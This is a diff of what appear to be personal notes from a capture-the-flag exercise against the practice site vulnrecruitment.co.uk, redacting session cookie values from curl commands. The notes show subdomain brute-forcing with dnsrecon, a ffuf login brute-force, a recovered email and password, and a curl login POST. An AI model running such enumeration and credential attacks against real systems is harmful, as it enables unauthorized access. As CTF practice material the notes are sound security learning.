@@ -5,7 +5,7 @@ server: nginx/1.21.1 (Ubuntu)
 dnsrecon -d vulnrecruitment.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 //Subdomains found: admin.vulnrecruitment.co.uk
-curl admin.vulnrecruitment.co.uk -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl admin.vulnrecruitment.co.uk -H "Cookie: "
 //["You are not allowed access from this IP address"]
 
 Contents discovery (admin.vulnrecruitment.co.uk):
@@ -95,7 +95,7 @@ ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: " -w
 email: archie.bentley@vulnrecruitment.co.uk
 password: thunder
 
-curl -X POST -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder" http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl -X POST -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder" http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: "
 
 //Need 4 digit authentication code...
 
